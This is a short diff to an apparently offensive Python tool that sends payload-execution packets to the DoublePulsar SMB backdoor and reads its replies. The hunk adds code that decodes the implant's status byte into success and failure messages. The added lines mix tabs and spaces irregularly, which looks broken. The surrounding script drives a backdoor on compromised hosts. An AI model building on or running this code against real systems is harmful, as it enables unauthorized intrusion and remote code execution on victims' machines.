@@ -570,6 +570,17 @@ if __name__ == "__main__":
             s.send(last_doublepulsar_exec_packet)
             smb_response = s.recv(1024)
 
+            if smb_response[34] == 82:
+	            print("Doublepulsar returned:  Success!\n")
+                #0x62
+            elif smb_response[34] == 98:
+	            print("Doublepulsar returned:  Invalid parameters!\n")
+                #0x72
+            elif smb_response[34] == 114:
+	            print("Doublepulsar returned:  Allocation failure!\n")
+            else:
+	            print("Doublepulsar didn't succeed\n")
+
             BytesLeft -= remainder
             print("Bytes left -> %d", BytesLeft)
 
